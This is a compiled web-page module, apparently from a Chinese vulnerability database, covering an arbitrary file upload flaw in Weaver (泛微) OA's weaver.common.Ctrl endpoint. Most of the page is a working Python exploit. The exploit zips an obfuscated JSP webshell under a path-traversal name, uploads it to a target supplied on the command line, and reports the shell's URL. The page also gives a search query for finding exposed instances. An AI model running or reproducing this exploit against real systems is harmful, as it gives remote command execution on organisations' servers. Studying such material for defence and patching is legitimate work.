import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as p,c as o,a as n,b as s,d as i,e as l}from"./app-58e4a7d6.js";const c={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器。 参考阅读：",-1),d={href:"https://github.com/GTX8090TI/GTX8090TI.github.io/blob/6dd04a19bbc4fcef436e0b2f05c15bc98ac0c852/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/index.html",target:"_blank",rel:"noopener noreferrer"},k=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>泛微OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;泛微-协同办公OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>存在漏洞的路径为</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>请求包为</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091039784.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用POC文件上传</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091039689.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> random
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests



<span class="token keyword">def</span> <span class="token function">generate_random_str</span><span class="token punctuation">(</span>randomlength<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  random_str <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
  base_str <span class="token operator">=</span> <span class="token string">&#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;</span>
  length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>base_str<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>randomlength<span class="token punctuation">)</span><span class="token punctuation">:</span>
    random_str <span class="token operator">+=</span> base_str<span class="token punctuation">[</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">]</span>
  <span class="token keyword">return</span> random_str

mm <span class="token operator">=</span> generate_random_str<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

webshell_name1 <span class="token operator">=</span> mm<span class="token operator">+</span><span class="token string">&#39;.jsp&#39;</span>
webshell_name2 <span class="token operator">=</span> <span class="token string">&#39;../../../&#39;</span><span class="token operator">+</span>webshell_name1

<span class="token keyword">def</span> <span class="token function">file_zip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    shell <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;
&lt;%
    if(request.getParameter(&quot;cmd&quot;)!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new
                        Object[]{}), request.getParameter(&quot;cmd&quot;) );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&quot;
&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print(&quot;&lt;/pre&gt;&quot;);
    }
%&gt;
    &quot;&quot;&quot;</span>   <span class="token comment">## 替换shell内容</span>
    zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token string">&#39;.zip&#39;</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>
    zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>webshell_name2<span class="token punctuation">,</span> shell<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GetShell</span><span class="token punctuation">(</span>urllist<span class="token punctuation">)</span><span class="token punctuation">:</span>
    file_zip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;上传文件中&#39;</span><span class="token punctuation">)</span>
    urls <span class="token operator">=</span> urllist <span class="token operator">+</span> <span class="token string">&#39;/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp&#39;</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">&#39;file1&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token string">&#39;.zip&#39;</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token string">&#39;.zip&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;application/zip&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>urls<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    GetShellurl <span class="token operator">=</span> urllist<span class="token operator">+</span><span class="token string">&#39;/cloudstore/&#39;</span><span class="token operator">+</span>webshell_name1
    GetShelllist <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> GetShellurl<span class="token punctuation">)</span>
    <span class="token keyword">if</span> GetShelllist<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;利用成功webshell地址为:&#39;</span><span class="token operator">+</span>GetShellurl<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;未找到webshell利用失败&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        GetShell<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;python3 poc.py http://xx.xx.xx.xx&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13);function v(m,b){const a=t("ExternalLinkIcon");return p(),o("div",null,[r,u,n("ul",null,[n("li",null,[n("a",d,[s("原漏洞公开地址"),i(a)])])]),k])}const _=e(c,[["render",v],["__file","泛微OA weaver.common.Ctrl 任意文件上传漏洞.html.vue"]]);export{_ as default};
